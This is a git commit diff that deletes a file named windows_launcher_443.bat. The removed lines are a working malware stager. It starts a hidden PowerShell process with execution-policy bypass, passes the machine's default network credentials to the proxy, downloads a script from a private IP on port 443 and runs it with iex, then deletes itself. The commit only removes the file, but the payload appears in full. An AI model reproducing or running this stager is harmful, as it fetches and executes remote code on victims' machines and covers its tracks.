2b0f97010b62d9229b3a3810d1781480f2b250d3
kb-singh <81980911+kb-singh@users.noreply.github.com>
2023-04-11 11:05:12 +0530

    Delete windows_launcher_443.bat

--- windows_launcher_443.bat
+++
@@ -1,3 +0,0 @@
-@echo off
-start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.108.10:443/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex"
-(goto) 2>nul & del "%~f0"
